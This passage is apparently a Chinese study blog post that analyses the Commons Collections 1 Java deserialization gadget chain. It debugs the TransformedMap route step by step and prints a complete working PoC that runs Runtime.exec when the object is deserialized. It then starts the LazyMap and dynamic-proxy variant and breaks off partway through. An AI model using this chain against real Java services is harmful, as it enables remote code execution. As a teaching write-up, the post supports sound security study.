<p>因为在InvokerTransformer的tranform中：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512153300247.png" alt="image-20210512153300247"></p>
<p>上来先input.getClass了，别忘了我们给的东西是Runtime.class，那结果肯定是Class对象java.lang.Class。</p>
<p>在java.lang.Class中寻找getRuntime对象肯定是找不到的。</p>
<p>所以这时候需要换一个思路：<strong>先拿到梯子，这里面的梯子就是getMethod方法</strong></p>
<p>目标语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">目标语句</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>步走</span><br><span class="line"><span class="number">1</span>.先获得getMethod的方法对象，这个方法在java.lang.Class中</span><br><span class="line">Method gm = Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line"><span class="number">2</span>.拿到之后，需要把getRuntime函数取出来。因为getMethod方法的作用就是返回一个method对象，所以直接invoke就行</span><br><span class="line">Method gr = gm.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line"><span class="number">3</span>.准备用gm去把invoke引出来</span><br><span class="line">Method i = gm.invoke(Class.forName(<span class="string">"java.lang.reflect.Method"</span>),<span class="string">"invoke"</span>)</span><br><span class="line"><span class="number">4</span>.组合到一起</span><br><span class="line">i.invoke("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure>

<p>晕的可以往下看：</p>
<p>失败版构造：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想拿到getRuntime方法，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个Method方法</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>InvokerTransformer的参数包括(方法名a，a的参数类型，invoke的参数{对象，对象参数})</p>
<p>我们认为可以，但实际上还是不行，原因：</p>
<p>在第二步出来之后，object是getRuntime，是method对象，<strong>一个Method对象是不能调用exec()的</strong></p>
<p>所以我们这里还需要<strong>invoke</strong>函数的参与</p>
<p>所以我们还需要再来一步得到invoke函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),//先获取<span class="title">Runtime</span>实例</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">       <span class="comment">//还需要填充，调用getRuntime得到Runtime实例,第一个参数是获取的方法，这里先获取getMethod方法，第二个是参数列表，这个是getMethod方法的参数列表，第三个参数是invoke方法的参数列表，这里我们想先反射出来getRuntime参数，这部分在经过transform函数处理之后，返回的是getRuntime()这样的一个方法。</span></span><br><span class="line">  			new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">          <span class="comment">//把invoke方法引出来，看好参数的类别，该占位占位</span></span><br><span class="line">        new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">          <span class="comment">//最后一轮是先获取exec方法，invoke方法的命令是“open /Applications/Calculator.app”</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里重点记录一下invoke环节的debug过程：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input=getRuntime这个Method对象</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Method（getRuntime方法是Method类）</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes); <span class="comment">//在method类中找到invoke方法，method=invoke方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs); <span class="comment">//调用invoke方法，input=getRuntime这个方法，传入自定义的参数</span></span><br></pre></td></tr></table></figure>

<p>最后一步其实就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p>发现一个骚东西：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke.invoke(a,&#123;b,c&#125;)</span><br><span class="line">  a.invoke(b,c)</span><br><span class="line">  	b.a(c)</span><br></pre></td></tr></table></figure>

<p>套用在最后一句上：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invoke.invoke(getRuntime(),<span class="keyword">null</span>);</span><br><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>这里为什么null可以呢？</p>
<p>是因为getRuntime函数是static的，根本不需要obj来hold。</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513015209016.png" alt="image-20210513015209016" style="zoom:50%;">

<p>所以这里这两种写法<strong>都可以</strong>：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;null,new Object[]&#123;&#125;&#125;)</span><br><span class="line">new InvokerTransformer("invoke", new Class[]&#123;String.class,Object[].class&#125;, new Object[]&#123;Class.forName("java.lang.Runtime"),new Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>多说一句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getRuntime().invoke(<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>这句话相当于：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getRuntime() 后面都是寂寞</span><br><span class="line">getRuntime() =&gt; Runtime 实例</span><br></pre></td></tr></table></figure>

<p>既然能返回Runtime实例，目标达成。</p>
<p>第四步debug：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//input=Runtime类实例</span></span><br><span class="line">Class cls = input.getClass();<span class="comment">//cls = java.lang.Runtime </span></span><br><span class="line">Method method = cls.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//在Runtime类中找到exec方法，method=exec方法</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="string">"open /Applications/Calculator.app"</span>); <span class="comment">//调用invoke方法</span></span><br></pre></td></tr></table></figure>

<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512161134367.png" alt="image-20210512161134367" style="zoom:80%;">

<p>所以目前demo3.0:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChainedTransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">				<span class="comment">//触发</span></span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们最想要的是，transform方法最好也要自动触发，所以发现了checkSetValue方法，它会自动调用transform方法。</p>
<p>checkSetValue方法属于每一个继承了AbstractInputCheckedMapDecorator的类，TransformedMap算一个。</p>
<p>所以接下来我们的目标就变成了<strong>如何让TransformedMap自动调用transform方法</strong>。</p>
<p><strong>我们的ChainedTransformer说到底就是一个Transformer，只要添加数据至map中就会自动调用tramsform，就会执行转换链执行payload。</strong></p>
<p>这样我们就可以把触发条件从显性的调用<strong>转换链的transform函数</strong>延伸到<strong>修改map的值</strong>。<strong>很明显后者是一个常规操作，极有可能被触发。</strong></p>
<p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure>

<p>可以看到三个参数，map，keyTransformer，valueTransformer。</p>
<p>查看org.apache.commons.collections.map.TransformedMap#decorate源码：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512170116032.png" alt="image-20210512170116032"></p>
<p>到这里，触发条件就是更改map的值(key或者value)即可。</p>
<h4 id="寻找readObject复写点"><a href="#寻找readObject复写点" class="headerlink" title="寻找readObject复写点"></a>寻找readObject复写点</h4><p>感觉还是奇怪，需要服务端配合将反序列化内容反序列化为map，并对值进行修改。</p>
<p>如果某个可序列化的类重写了<code>readObject()</code>方法，并且在<code>readObject()</code>中对Map类型的变量进行了key-value修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
<p>在1.7中存在一个完美的复写点：<strong>sun.reflect.annotation.AnnotationInvocationHandler</strong></p>
<p>关于AnnotationInvocationHandler类，这个类本身是被设计用来处理Java注解的。</p>
<p>看两处源码关键点：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512171701564.png" alt="image-20210512171701564"></p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512172608629.png" alt="image-20210512172608629" style="zoom:95%;">

<h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p><strong>为什么要传入Target.class?</strong></p>
<p>Target是Java提供的四个元注解之一(Target，Documented，Inherited)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type)</span><br></pre></td></tr></table></figure>

<p>我们回来看<code>AnnotationType.getInstance(this.type)</code>对@Target这个注解的处理。var2=getInstance会获取到@Target的基本信息，包括注解元素，注解元素的默认值，生命周期，是否继承等等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var3 = var2.memberTypes();</span><br></pre></td></tr></table></figure>

<p>var3就是var2的键值对类型，可以取值<code>Ljava.lang.annotation.ElementType</code>类型的值。</p>
<p>这里其实占了Java注解的语法糖的便宜，Java注解默认都是value = XXXX，相当于蹭了个谐音梗。</p>
<p><strong>为什么一定要Map(“value”, “value”)?</strong></p>
<p>因为在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">//var3 = &#123;value：ElementType&#125;</span></span><br></pre></td></tr></table></figure>

<p>这就保证了在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map var3 = var2.memberTypes();<span class="comment">// var3 = &#123;value：ElementType&#125;</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); <span class="comment">// var4 是迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">  Entry var5 = (Entry)var4.next();<span class="comment">//var5 = &#123;value:value&#125;</span></span><br><span class="line">  String var6 = (String)var5.getKey();<span class="comment">// var6 = value</span></span><br><span class="line">  Class var7 = (Class)var3.get(var6); <span class="comment">//ElementType</span></span><br><span class="line">  <span class="comment">//从@Target的注解元素键值对&#123;value：ElementType的键值对&#125;中去寻找键名为key的值</span></span><br><span class="line">  <span class="comment">//如果key的值不是value，那么这里就null，链就断掉了</span></span><br><span class="line">  <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">//触发命令执行处</span></span><br><span class="line">    var5.setValue...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>保证<code>innerMap.put(&quot;value&quot;,&quot;xxxxxx&quot;)</code>也是可以的，只要key的值为”value“就行。</strong></p>
<h4 id="最终版本PoC"><a href="#最终版本PoC" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h4><p>最终版本PoC构造如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>挖掘流程：</p>
<ol>
<li>找readObejct复写点，发现了TransformedMap实现了，进去看一看，留个心</li>
<li>阅读文档，发现TransformedMap机制是一旦该Map中的元素发生了变化，都会调用Transformer的transform方法</li>
<li>发现Transformer的transform就是个接口中的方法</li>
<li>依次查看Transformer的实现类，发现ChainedTransformer中的transform会成环调用自身Transformer数组中的Transformer</li>
<li>[支线任务开启]寻找invoke调用2点，发现InvokerTransformer内部的transform方法符合反射调用，有可控潜力</li>
<li>为了符合exp的构造条件，发现ConstantTransformer可以参与</li>
<li>将一句话分别由多个Transformer来hold，形成了ChainedTransformer，为了让ChainedTransformer.transform可以自动化调用，下一步需要去找哪里用了transform方法</li>
<li>查看transform的调用，发现TransformedMap类中有checkSetValue方法调用了transform方法</li>
<li>同时发现checkSetValue是抽象类AbstractInputCheckedMapDecorator的方法，同时该类内部静态类MapEntry的setValue方法调用了checkSetValue方法</li>
<li>实现AbstractInputCheckedMapDecorator的类有四个，TransformedMap算一个。所以TransformedMap1既是readObject复写点，又是执行链的起点(更改map中的值)[支线任务结束]</li>
<li>如何来自动更改值，还是去找readObejct复写点，发现AnnotationInvocationHandler十分合适，既复写了readObject，又修改了map的值，可以包装到最外面</li>
<li>编写Exp</li>
</ol>
<p><strong>Exp利用流程</strong>：</p>
<ol>
<li>AnnotationInvocationHandler#readObject函数会在反序列化中被执行，并且会触发TransformedMap$EntrySet的setValue赋值。</li>
<li>EntrySet的构造函数是Set和AbstractInputCheckedMapDecorator类型。</li>
<li>由于TransformedMap继承了AbstractInputCheckedMapDecorator类，也就继承了AbstractInputCheckedMapDecorator内部的setValue方法。</li>
<li>setValue就是AbstractInputCheckedMapDecorator.MapEntry#setValue，他的内部会调用checkSetValue方法。</li>
<li>这里面的map是TransformedMap，所以TransformedMap版本的checkSetValue会调用transform方法，这个transform会调用TransformedMap自身的ConstantTransformer数组，循环调用。这个ConstantTransformer是通过decorate函数将ConstantTransformer配置进去的，最终payload执行。</li>
</ol>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513192345876.png" alt="image-20210513192345876"></p>
<p>这里值得细细地跟一下，TransformedMap并不是Map</p>
<p>this.memberValues = [TransformedMap outMap] = (&lt;”value”,”value”&gt;，chain)</p>
<p>TransformedMap自己没有entrySet，所以会执行距离它最近的父类的entrySet方法。</p>
<p>也就是AbstractInputCheckedMapDecorator的entrySet方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513202149561.png" alt="image-20210513202149561"></p>
<p>这里map的值为HashMap&lt;”value”,”value”&gt;，this是本类对象 TransformedMap outMap</p>
<p>调用的是本类内部类EntrySet的构造函数</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513203152290.png" alt="image-20210513203152290"></p>
<p>所以这个Entry函数ruturn回去就是一个AbstractInputCheckedMapDecorator$EntrySet的对象，结构是(注意他们的类别)：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205357509.png" alt="image-20210513205357509"></p>
<p>&lt;&lt;”value”,”value”&gt;,outMap&gt;就是var5</p>
<p>接下来会执行iterator方法，这个方法AbstractInputCheckedMapDecorator#EntrySet也做了实现：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205526861.png" alt="image-20210513205526861"></p>
<p>可以看出，实现了对collection的迭代器和parent的操作</p>
<p>跟进去看EntrySetIterator的实现：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513205918283.png" alt="image-20210513205918283"></p>
<p>返回一个迭代器就是var4，是。</p>
<p>接下来，var5=var4.next()</p>
<p>跟进去next方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210302272.png" alt="image-20210513210302272"></p>
<p>好家伙，直接返回了一个MapEntry,entry是entry，parent一直都是TransformedMap outMap</p>
<p>这下终于理清了，是cc直接搞得鬼。</p>
<p>var5就是AbstractInputCheckedMapDecorator$MapEntry类</p>
<p>接下来之后对var5进行setValue调用，由于var5是AbstractInputCheckedMapDecorator$MapEntry对象，所以会执行自己的setValue方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210604593.png" alt="image-20210513210604593"></p>
<p>由于这里parent一直是TransformedMap对象outMap，所以调用的是TransformedMap的checkSetValue方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513210818971.png" alt="image-20210513210818971"></p>
<p>可以看到，这时候outMap一直帮我们存着的chain原来放在了valueTransformer的属性里，也就自然会被执行了。</p>
<p>接下来就是熟悉的情节了：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513211012291.png" alt="image-20210513211012291"></p>
<p>触发。</p>
<h3 id="LazyMap版本"><a href="#LazyMap版本" class="headerlink" title="LazyMap版本"></a>LazyMap版本</h3><p>LazyMap也调用了transform方法。</p>
<h4 id="利用链寻找-1"><a href="#利用链寻找-1" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>对Transformer接口中的transform方法find usage：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111502143.png" alt="image-20210513111502143"></p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111521568.png" alt="image-20210513111521568"></p>
<p>get方法首先判断map中是否已有该key，如果不存在，最终会到factory.transform进行处理。</p>
<img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513111833377.png" alt="image-20210513111833377" style="zoom:80%;">

<p>能发现decorate方法可以new一个LazyMap方法，如果factory可控，就很有搞头了。</p>
<p>接下来要找找哪些方法会调用LazyMap的get方法(最好是readObject内部会用到，最契合的条件，可惜没有)</p>
<p>坑点记录：<a href="https://0range228.github.io/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E7%BA%BFrt-jar/">记一次对线rt.jar</a></p>
<p>发现AnnotationInvocationHandler内部的invoke调用了get方法：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513153931088.png" alt="image-20210513153931088"></p>
<p>我们可以发现在这个类中，memberValues是Map对象，并且有对map的get操作。</p>
<p>LazyMap也是Map的子类，重写了get方法，所以这里如果memberValues是LazyMap类对象，会成功调用LazyMap的get方法，就可以触发漏洞。</p>
<p>所以如何触发这个invoke函数呢？</p>
<h4 id="PoC构造"><a href="#PoC构造" class="headerlink" title="PoC构造"></a>PoC构造</h4><p>需要依赖动态代理，参考<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">之前的博客</a>：</p>
<p><strong>总结就是被动态代理的对象调用任意方法都会调用对应的InvocationHandler的invoke方法。</strong></p>
<p>写个小例子好理解：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513160306511.png" alt="image-20210513160306511"></p>
<p>目前已有条件：</p>
<ul>
<li>AnnotationInvocationHandler的readObject方法可以触发setValue，</li>
<li>cc里面很多Map的setValue方法可以调用transform方法</li>
<li>LazyMap的invoke可以调用Map.get方法，LazyMap重写的get方法可以触发transform方法</li>
<li>ChainedTransformer的transform方法可以将里面InvokerTransformer的内容进行成环invoke触发</li>
</ul>
<p>这个感觉就像：</p>
<p>handler是一个InvocationHandler类对象，他内部有invoke方法</p>
<p>我们可以做一个代理类a，让这个代理类代理LazyMap对象,handler也参与，负责invoke</p>
<p>这样的话，无论以后a调用了LazyMap内部的任何方法，他都会先走一遍handler的invoke方法。</p>
<p>注意最后一句话，我们想让”他都会先走一遍handler的invoke方法”，handler的<strong>invoke方法</strong>，<strong>就是LazyMap的invoke方法</strong>。</p>
<p>抱着这个目标，我们还可以发现:</p>
<ul>
<li>AnnotationInvocationHandler继承了InvocationHandler，它也可以当动态代理，也可以作为handler</li>
</ul>
<p>所以我们可以：</p>
<ul>
<li>先拿到AnnotationInvocationHandler的构造函数cons</li>
<li>先用cons做一个AnnotationInvocationHandler的实例h1，h1的memberValues属性是一个LazyMap(包装好innermap和chain)</li>
<li>再用h1参与Proxy.newProxyInstance，去做一个LazyMap的代理实例mapProxy</li>
<li>再用cons去做一个AnnotationInvocationHandler的实例h2，h2的memberValues属性是mapProxy</li>
</ul>
<p>这时候h2作为payload，参与序列化操作。</p>
<p>我们主要关注反序列化：</p>
<p>断点下到第一个readObject位置，java.io.ObjectInputStream#readSerialData：</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513170527485.png" alt="image-20210513170527485"></p>
<p>slots数组里面的内容就是h2，可以看到类型是AnnotationInvocationHandler</p>
<p>接下来会走到java.io.ObjectInputStream#invoke方法，可以看到ma=readObject，obj=h2</p>
<p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210513171248714.png" alt="image-20210513171248714"></p>
